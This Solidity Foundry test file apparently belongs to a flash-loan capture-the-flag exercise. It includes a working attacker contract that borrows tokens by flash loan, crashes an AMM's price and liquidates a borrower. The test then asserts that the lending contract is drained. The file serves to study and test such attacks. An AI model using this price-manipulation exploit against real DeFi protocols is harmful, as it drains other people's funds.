// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {CollateralToken} from "../src/FlashLoanCTF/CollateralToken.sol";
import {AMM} from "../src/FlashLoanCTF/AMM.sol";
import {Lending} from "../src/FlashLoanCTF/Lending.sol";
import {FlashLender} from "../src/FlashLoanCTF/Flashloan.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

pragma solidity ^0.8.0;

contract FlashLoanTest is Test {
    CollateralToken collateralToken;
    AMM amm;
    Lending lending;
    FlashLender flashLender;
    address public owner = makeAddr("owner");
    address public lender = makeAddr("lender");
    address public borrower = makeAddr("borrower");

    function setUp() public {
        // pre-computed with RLP encoding of owner address and nonce
        address ammAddress = 0xCeF98e10D1e80378A9A74Ce074132B66CDD5e88d;
        vm.deal(lender, 100 ether);
        vm.deal(owner, 100 ether);
        vm.startPrank(owner);
        collateralToken = new CollateralToken();
        collateralToken.approve(ammAddress, type(uint256).max);

        amm = new AMM{value: 20 ether}(address(collateralToken));
        assertEq(address(amm), ammAddress);

        address[] memory supportedTokens = new address[](1);
        supportedTokens[0] = address(collateralToken);
        lending = new Lending(address(amm));
        flashLender = new FlashLender(supportedTokens, 0);

        collateralToken.transfer(address(flashLender), 500 ether);

        (bool success,) = address(lending).call{value: 6 ether}("");
        require(success, "Lending failed");

        collateralToken.transfer(borrower, 500 ether);
        vm.stopPrank();

        vm.startPrank(borrower);
        collateralToken.approve(address(lending), type(uint256).max);
        lending.borrowEth(6 ether);
        vm.stopPrank();
    }

    function testFlashLoan() public {
        uint256 currentNonce = vm.getNonce(lender);

        vm.startPrank(lender);
        FlashLoanAttacker attacker =
            new FlashLoanAttacker(flashLender, collateralToken, amm, address(borrower), lending);
        attacker.hack();
        vm.stopPrank();

        int256 difference = int256(collateralToken.balanceOf(lender)) - int256(240 ether);

        assert(difference > -30);
        assertEq(collateralToken.balanceOf(address(lending)), 0);
        assertEq(address(lending).balance, 0);
        assert(vm.getNonce(lender) < currentNonce + 3);
    }
}

contract FlashLoanAttacker is IERC3156FlashBorrower {
    bytes32 public constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    FlashLender flashLender;
    CollateralToken collateralToken;
    AMM amm;
    address target;
    Lending lending;
    address public owner;
    uint256 public totalBorrowedAmount;

    constructor(
        FlashLender _flashLender,
        CollateralToken _collateralToken,
        AMM _amm,
        address _target,
        Lending _lending
    ) {
        flashLender = _flashLender;
        collateralToken = _collateralToken;
        amm = _amm;
        target = _target;
        lending = _lending;
        owner = msg.sender;
    }

    function hack() public {
        uint256 borrowedAmount = collateralToken.balanceOf(address(flashLender));
        uint256 flashFee = flashLender.flashFee(address(collateralToken), borrowedAmount);
        totalBorrowedAmount = borrowedAmount + flashFee;

        flashLender.flashLoan(this, address(collateralToken), borrowedAmount, "");
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        _attack();
        return CALLBACK_SUCCESS;
    }

    function _attack() internal {
        console.log("Attacker balance before: %d", collateralToken.balanceOf(owner));
        collateralToken.approve(address(flashLender), type(uint256).max);
        collateralToken.transfer(address(amm), collateralToken.balanceOf(address(this)));
        amm.swapLendTokenForEth(address(this));
        lending.liquidate(target);
        amm.swapEthForLendToken{value: address(this).balance}(address(this));
        collateralToken.transfer(owner, collateralToken.balanceOf(address(this)) - totalBorrowedAmount);
        console.log("Attacker balance after: %d", collateralToken.balanceOf(owner));
    }

    receive() external payable {}
}
